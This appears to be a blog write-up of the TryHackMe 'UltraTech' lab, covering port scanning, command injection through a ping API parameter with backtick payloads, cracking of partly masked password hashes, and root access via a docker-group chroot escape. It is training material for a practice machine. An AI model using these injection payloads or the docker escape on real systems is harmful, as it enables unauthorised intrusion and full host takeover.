---
layout: default
title : bvr0n - UltraTech Write-up
---

_**Oct 06, 2020**_

[UltraTech](https://tryhackme.com/room/ultratech1) Writeup

## Nmap Scan :

```
bvr0n@kali:~$ nmap -sC -sV -p- 10.10.180.145

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Directories Brute Forcing :

```
bvr0n@kali:~$ ffuf -c -u http://10.10.180.145:8081/FUZZ -w Documents/Dirbuster/wordlist.txt
auth                    [Status: 200, Size: 39, Words: 8, Lines: 1]
```
```
bvr0n@kali:~$ ffuf -c -u http://10.10.180.145:31331/FUZZ -w Documents/Dirbuster/wordlist.txt
.htaccess               [Status: 403, Size: 300, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 295, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 300, Words: 22, Lines: 12]
css                     [Status: 301, Size: 321, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 15078, Words: 11, Lines: 7]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 6092, Words: 393, Lines: 140]
javascript              [Status: 301, Size: 328, Words: 20, Lines: 10]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 6]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12]
```
In /robots.txt we found this :
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```
Goin to `/utech_sitemap.txt` give us this :
```
/
/index.html
/what.html
/partners.html
```

`/partners.html` seems to be a login page, inspecting the code source and checking what the API does, and this part caught my eyes :
```js
 function checkAPIStatus() {
        const req = new XMLHttpRequest();
        try {
            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            req.open('GET', url, true);
            req.onload = function (e) {
                if (req.readyState === 4) {
                    if (req.status === 200) {
                        console.log('The api seems to be running')

```
I tried going to `http://10.10.180.145:8081/ping?ip=10.10.180.145` , And it seems like Code Execution :
```
PING 10.10.180.145 (10.10.180.145) 56(84) bytes of data.
64 bytes from 10.10.180.145: icmp_seq=1 ttl=64 time=0.016 ms

--- 10.10.180.145 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms
```
I tried to execute other commands and it worked :
```
http://10.10.180.145:8081/ping?ip=10.10.180.145%20`whoami`
ping: www: Temporary failure in name resolution 

http://10.10.180.145:8081/ping?ip=10.10.180.145%20`ls`
ping: utech.db.sqlite: Name or service not known 
```

That file contained password hashes for 2 accounts : `admin` & `r00t`, Let's crack them using an [Online Tool](https://md5decrypt.net/) :
```
r00t : f357a0c******63c7c7b76c1e7543a32 : n****06 
admin : 0d0ea5111e3c1******c1684e3b9be84 : mr****fy 
```

When we login we get this : 
```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

## Internal Enum :

Since we have `r00t` credentials, Let's login to SSH.

After running id looks like we are in a docker :
```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

We then check [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) : 
```
r00t@ultratech-prod:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This command won't work because there is no image named alphinen but we do have bash as image :
```
r00t@ultratech-prod:/tmp$ docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS               NAMES
aee9902a5c43        495d6437fc1e        "docker-entrypoint.s…"   19 minutes ago      Up 17 minutes                                    cocky_goodall
7beaaeecd784        bash                "docker-entrypoint.s…"   18 months ago       Exited (130) 18 months ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_volhard
```
Executing this command give us root :
```
r00t@ultratech-prod:/tmp$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
root@41ff56823b91:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@41ff56823b91:/#
```

Thank's [m3dsec](https://github.com/m3dsec) for the reference ;)

<br>
best regards

[bvr0n](https://github.com/bvr0n)


<br>
[back to main()](../../index.md)

<br>
